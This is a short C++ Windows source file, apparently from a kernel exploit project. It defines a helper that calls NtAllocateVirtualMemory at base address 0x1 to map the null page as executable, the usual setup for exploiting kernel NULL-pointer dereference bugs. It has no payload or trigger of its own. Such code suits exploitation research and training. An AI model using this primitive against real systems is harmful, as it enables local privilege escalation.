#include <iostream>

#include "utils.h"

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
	);

NTSTATUS AllocateNullPage(DWORD dwRegionSize) {
	pNtAllocateVirtualMemory ntAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
		"NtAllocateVirtualMemory");
	if (!ntAllocateVirtualMemory) {
		std::cout << "[-] Could not resolve NtAllocateVirtualMemory address" << std::endl;
		return STATUS_DLL_NOT_FOUND;
	}

	PVOID BaseAddress = (PVOID)0x1;

	NTSTATUS res = ntAllocateVirtualMemory(GetCurrentProcess(),
											&BaseAddress,
											NULL,
											&dwRegionSize,
											MEM_COMMIT | MEM_RESERVE,
											PAGE_EXECUTE_READWRITE);
	if (res != 0) {
		std::cout << "[-] Could not allocate null page - " << GetLastError() << std::endl;
		return res;
	}

	return 0;
}